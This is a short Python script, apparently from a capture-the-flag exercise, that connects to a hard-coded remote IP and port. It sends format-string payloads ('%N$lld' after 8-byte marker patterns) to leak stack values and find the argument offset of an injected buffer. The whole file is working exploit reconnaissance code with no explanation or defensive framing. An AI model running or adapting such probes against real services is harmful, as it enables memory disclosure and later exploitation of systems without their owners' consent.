#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception as e: return ('<T>'+str(e).encode())
# vary 8-byte pattern at start, append %N$lld for N=6..12
pats=[b"A"*8, b"B"*8, b"C"*8, b"12345678", b"X"*8]
for N in [6,7,8,9,10]:
    row=[]
    for pat in pats:
        d=ask(pat + b"%%%d$lld" % N)
        m=re.search(rb'([0-9-]+)\n', d)
        v=int(m.group(1)) if m else None
        row.append((pat[:3], hex(v&((1<<64)-1)) if v is not None else repr(d)))
    print("arg%d:"%N, row)
s.close()
